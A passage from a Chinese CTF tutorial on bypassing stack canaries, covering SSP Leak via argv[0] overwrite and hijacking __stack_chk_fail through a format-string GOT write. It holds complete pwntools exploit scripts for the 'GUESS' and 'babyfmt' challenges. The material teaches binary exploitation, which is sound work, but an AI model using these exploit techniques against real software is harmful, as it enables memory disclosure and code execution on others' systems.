                break
    log.info("爆破出canary的值为%#x"%(u32(canary)))
    log.info("---------------------------测试canary正确性-----------------------------------")
    r.sendline("Y")
    print r.recv()
    r.sendline("wxm")
    print r.recv()
    libc_so_6_str_addr = 0x0804833D
    payload = "a"*16+canary+"a"*12+p32(file.plt['puts'])+"aaaa"+p32(libc_so_6_str_addr)
    r.sendline(payload)
    r.recv()
成功输出：
## 三、SSP Leak
全称是Stack Smashing Protect Leak
，这种方法没办法让我们getshell，但是我们可以利用这种方法获取到内存中的值，比如当flag在内存中储存时，我们就可以利用这个方法来读取flag
在函数结尾处检查canary时，若canary被改变，则程序在终止之前会执行__stack_chk_fail函数，如下所示：
__stack_chk_fail()函数定义如下：
    eglibc-2.19/debug/stack_chk_fail.c
    void __attribute__ ((noreturn)) __stack_chk_fail (void)
    {
      __fortify_fail ("stack smashing detected");
    }
    void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
    {
      /* The loop is added only to keep gcc happy.  */
      while (1)
        __libc_message (2, "*** %s ***: %s terminatedn",
                        msg, __libc_argv[0] ?: "");
    }
当程序中存在栈溢出，并且溢出的长度可以覆盖掉程序中argv[0]的时候，我们可以通过这种方法打印任意地址上的值，造成任意地址读。
更深一步的讲，对于linux，fs段寄存器实际指向的是当前栈的TLS结构，fs:0x28指向的正是stack_guard
    typedef struct
    {
      void *tcb;        /* Pointer to the TCB.  Not necessarily the
                           thread descriptor used by libpthread.  */
      dtv_t *dtv;
      void *self;       /* Pointer to the thread descriptor.  */
      int multiple_threads;
      uintptr_t sysinfo;
      uintptr_t stack_guard;
      ...
    } tcbhead_t;
如果存在溢出并且可以覆盖位于TLS中保存的canary值，那么就可以实现绕过保护机制
TLS中的值由函数security_init进行初始化
    static void
    security_init (void)
    {
      // _dl_random的值在进入这个函数的时候就已经由kernel写入.
      // glibc直接使用了_dl_random的值并没有给赋值
      // 如果不采用这种模式, glibc也可以自己产生随机数
      //将_dl_random的最后一个字节设置为0x0
      uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);
      // 设置Canary的值到TLS中
      THREAD_SET_STACK_GUARD (stack_chk_guard);
      _dl_random = NULL;
    }
    //THREAD_SET_STACK_GUARD宏用于设置TLS
    #define THREAD_SET_STACK_GUARD(value) 
      THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)
同样拿一道CTF题做例子（GUESS）来演示利用方式，该程序开启了canary和NX保护
程序先把flag读入到栈上，然后利用gets函数进行三次读入，这里可以进行三次栈溢出，然后利用SSP Leak将flag打印出来
首先找到argv[0]的地址，计算出偏移量，用gdb加载程序，在栈很高的地址上可以看到，它默认指向文件名
在gdb中调试出，我们输入的字符串s2在 “rbp-0x40”处，flag在”rbp-0x70处”，从而计算出能够覆盖掉argv[0]的偏移是0x128
根据第一次泄露出的puts函数的真实地址，计算出libc基地址
    payload = 'a'* 0x128 + p64(0x602020)*3
第二次泄露的_environ，也就是真实栈的地址
    environ_addr = libc_base + libc.symbols['_environ']
在linux应用程序运行时，内存的最高端是环境/参数节（environment/arguments
section），用来存储系统环境变量的一份复制文件，进程在运行时可能需要。
例如，运行中的进程，可以通过环境变量来访问路径、shell 名称、主机名等信息。  
该节是可写的，因此在格式串（format string）和缓冲区溢出（buffer overflow）攻击中都可以攻击该节。
*environ指针指向栈地址(环境变量位置)，有时它也成为攻击的对象，泄露栈地址，篡改栈空间地址，进而劫持控制流。环境表是一个表示环境字符串的字符指针数组，由”name=value”这样类似的字符串组成,它储存在整个进程空间的的顶部，其中value是一个以”″结束的C语言类型的字符串，代表指针该环境变量的值,一般我们见到的name都是大写，但这只是一个惯例
我们需要泄漏出栈的地址，才能泄漏出flag，而_environ存着栈的地址，所以我们需要泄漏_environ
第三次通过之前计算的偏移，直接泄露flag
完整exp：
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
    p = process('./GUESS.')
    puts_got = 0x602020
    #leak libc
    p.recvuntil('guessing flagn')
    payload = 'a'*0x128 + p64(puts_got)
    p.sendline(payload)
    p.recvuntil('detected ***: ')
    puts_addr = u64(p.recv(6).ljust(8,'x00'))
    log.success('puts addr : 0x%x' %puts_addr)
    #gdb.attach(p)
    offset_puts = 0x6f690
    libc_base = puts_addr - offset_puts
    log.success('libc base addr : 0x%x' %libc_base)
    addr__environ = 0x3c6f38
    _environ_addr = libc_base + addr__environ
    log.success('_environ addr : 0x%x' %addr__environ)
    #leak environ
    p.recvuntil('guessing flagn')
    payload = 'a'*0x128 + p64(_environ_addr)
    p.sendline(payload)
    p.recvuntil('detected ***: ')
    stack_base = u64(p.recv(6).ljust(8,'x00')) - 0x198
    log.success('stack base addr : 0x%x' %stack_base)
    flag_addr = stack_base + 0x30
    #leak flag
    p.recvuntil('guessing flagn')
    payload = 'a'*0x128 + p64(flag_addr)
    p.sendline(payload)
    p.recvuntil('detected ***: ')
    p.recvuntil('}')
    p.interactive()
## 四、劫持__stack_chk_fail函数
在开启canary保护的程序中，如果canary不对，程序会转到 **stack_chk_fail函数执行，**
stack_chk_fail函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。利用方式就是通过格式化字符串漏洞来修改GOT表中的值。
还是直接用CTF题上手（babyfmt），程序开启了canary和NX保护
main函数中存在栈溢出和格式化字符串漏洞
有一个hello函数，留了一个后门
由于栈溢出的长度不够我们覆盖掉返回地址，所以不能利用ROP来改变程序的流程，再一想，程序还存在格式化字符串漏洞，并且开启了canary保护，我们可以通过格式化字符串漏洞来篡改GOT表中__stack_chk_fail存储的地址，将它的地址修改成hello函数地址，然后通过栈溢出来覆盖canary，故意触发__stack_chk_fail函数的执行，相当于执行了hello函数，从而getshell
exp：
    #coding:utf-8
    from pwn import *
    from libformatstr import *
    context.log_level = 'debug'
    context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
    r = process("./babyfmt")
    file = ELF("./babyfmt")
    stack_chk_fail_got = file.got['__stack_chk_fail']
    log.info(hex(stack_chk_fail_got))#0x601018
    hello_addr = 0x400626
    # bufsiz = 50
    # r.sendline(make_pattern(bufsiz))             
    # data = r.recv() 
    # offset, padding = guess_argnum(data, bufsiz)
    log.info("offset : " + str(6))
    log.info("padding: " + str(0))
    p = FormatStr()
    p[stack_chk_fail_got] = hello_addr
    buf = p.payload(6,0)
    #gdb.attach(r)
    r.sendline(buf+"a"*(0x60-len(buf)))
    sleep(0.2)
    r.interactive()
## 个人感悟
以上总结的只是常见的利用手法，其实还有许多绕过canary保护的姿势！通过总结这篇文章，加深了我对二进制安全的理解，也希望能帮助到更多的人。
本文如有不妥之处，敬请斧正。
## 参考文献
[关于canary的总结](https://zhakul.top/archives/216)